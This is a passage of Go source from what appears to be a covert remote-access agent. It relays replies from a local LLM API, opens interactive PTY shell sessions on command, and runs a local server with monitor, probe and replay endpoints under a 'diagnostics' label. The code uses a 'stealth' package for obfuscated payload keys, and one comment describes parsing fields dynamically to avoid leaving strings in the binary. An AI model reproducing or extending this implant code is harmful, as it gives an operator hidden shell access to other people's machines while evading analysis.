	var assistantReply strings.Builder
	var lineBuf strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(buf)
		if n > 0 {
			lineBuf.Write(buf[:n])
			for {
				line, found := cutLine(&lineBuf)
				if !found {
					break
				}
				line = strings.TrimSpace(line)
				if !strings.HasPrefix(line, "data: ") {
					continue
				}
				data := strings.TrimPrefix(line, "data: ")
				if data == "[DONE]" {
					goto done
				}
				evt := parseMap([]byte(data))
				if len(evt) > 0 {
					// Sable API fields — parsed dynamically to avoid .rodata leaks
					if c, _ := evt["content"].(string); c != "" {
						assistantReply.WriteString(c)
					} else if t, _ := evt["type"].(string); t == "answer" {
						if tx, _ := evt["text"].(string); tx != "" {
							assistantReply.WriteString(tx)
						}
					}
				}
			}
		}
		if err != nil {
			break
		}
	}
done:

	return map[string]any{
		"reply":  assistantReply.String(),
		"chat_id": chatID,
		"mode":   "llm",
	}
}

// ── PTY Connect / Disconnect ─────────────────────────────────

func execPTYConnect(payload json.RawMessage) map[string]any {
	sessionID := payloadStr(payload, stealth.EncKeySessionID)
	cols := payloadInt(payload, stealth.EncKeyCols)
	rows := payloadInt(payload, stealth.EncKeyRows)

	if cols == 0 {
		cols = 120
	}
	if rows == 0 {
		rows = 40
	}

	sess, err := StartPTYLocal(sessionID, cols, rows)
	if err != nil {
		return map[string]any{"error": fmt.Sprintf("pty start: %v", err)}
	}

	ptySessions.Store(sessionID, sess)
	debugLog.Printf("[pty] started session=%s", sessionID)

	return map[string]any{
		"status":    "connected",
		"session_id": sessionID,
	}
}

func execPTYDisconnect(payload json.RawMessage) map[string]any {
	sessionID := payloadStr(payload, stealth.EncKeySessionID)

	if val, ok := ptySessions.LoadAndDelete(sessionID); ok {
		sess := val.(*PTYSession)
		sess.Close()
		debugLog.Printf("[pty] closed session=%s", sessionID)
	}

	return map[string]any{"status": "disconnected"}
}

func execLLMReset(payload json.RawMessage) map[string]any {
	chatID := payloadStr(payload, stealth.EncKeyChatID)

	localURL := fmt.Sprintf("http://127.0.0.1:%d", sablePort)

	if chatID != "" {
		req, _ := http.NewRequest("DELETE", localURL+"/api/chat/"+chatID, nil)
		resp, err := client.Do(req)
		if err != nil {
			return map[string]any{"error": fmt.Sprintf("reset failed: %v", err)}
		}
		resp.Body.Close()
		llmChats.Delete(chatID)
		return map[string]any{"status": "reset", "chat_id": chatID}
	}

	llmChats.Range(func(key, value any) bool {
		llmChats.Delete(key)
		return true
	})
	return map[string]any{"status": "all_reset"}
}

// ── Local Diagnostics HTTP Server ────────────────────────────

func startLocalServer() {
	mux := http.NewServeMux()

	mux.HandleFunc("POST /diag/monitor/register", handleMonitorRegister)
	mux.HandleFunc("POST /diag/monitor/heartbeat", handleMonitorHeartbeat)
	mux.HandleFunc("POST /diag/monitor/inactive", handleMonitorMarkInactive)
	mux.HandleFunc("POST /diag/monitor/unregister", handleMonitorUnregister)
	mux.HandleFunc("GET /diag/monitor/alive", handleMonitorAlive)
	mux.HandleFunc("GET /diag/monitor/sessions", handleMonitorAll)
	mux.HandleFunc("GET /diag/monitor/events", handleMonitorEvents)
	mux.HandleFunc("POST /diag/monitor/probe", handleMonitorProbe)
	mux.HandleFunc("POST /diag/monitor/clear", handleMonitorClear)

	mux.HandleFunc("POST /diag/replay/start", handleReplayStart)
	mux.HandleFunc("GET /diag/replay/{replay_id}", handleReplayResult)
	mux.HandleFunc("POST /diag/replay/stop", handleReplayStop)
	mux.HandleFunc("GET /diag/replays", handleReplayList)
	mux.HandleFunc("POST /diag/replay/clear", handleReplayClear)

	addr := fmt.Sprintf("127.0.0.1:%d", localPort)
	debugLog.Printf("[diag-server] listening on %s", addr)
	if err := http.ListenAndServe(addr, mux); err != nil {
		debugLog.Printf("[diag-server] error: %v", err)
	}
}
